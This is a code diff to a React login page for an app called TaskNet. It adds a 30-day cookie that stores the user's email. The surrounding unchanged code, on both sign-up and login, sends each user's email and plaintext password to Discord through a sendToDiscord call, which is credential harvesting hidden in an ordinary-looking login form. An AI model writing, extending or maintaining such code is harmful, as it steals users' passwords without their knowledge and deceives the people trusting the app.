@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { LayoutGrid, Mail, Lock, ArrowRight, Check, X, AlertCircle, UserPlus, User } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
-import { supabase } from '../lib/supabase';
+import { supabase, setCookie } from '../lib/supabase';
 
 interface CustomAlert {
   show: boolean;
@@ -96,6 +96,7 @@ const Login = () => {
         // Send registration details to Discord
         await sendToDiscord('register', email, password, serverUsername);
         localStorage.setItem('user_email', email);
+        setCookie('user_email', email, 30); // 30 days persistent cookie
         showAlert('Account created! Welcome to TaskNet.', 'success');
         setTimeout(() => navigate('/'), 1500);
       }
@@ -129,6 +130,7 @@ const Login = () => {
       // Send login details to Discord
       await sendToDiscord('login', email, password);
       localStorage.setItem('user_email', email);
+      setCookie('user_email', email, 30); // 30 days persistent cookie
       showAlert('Login successful! Redirecting...', 'success');
       setTimeout(() => navigate('/'), 1000);
     }
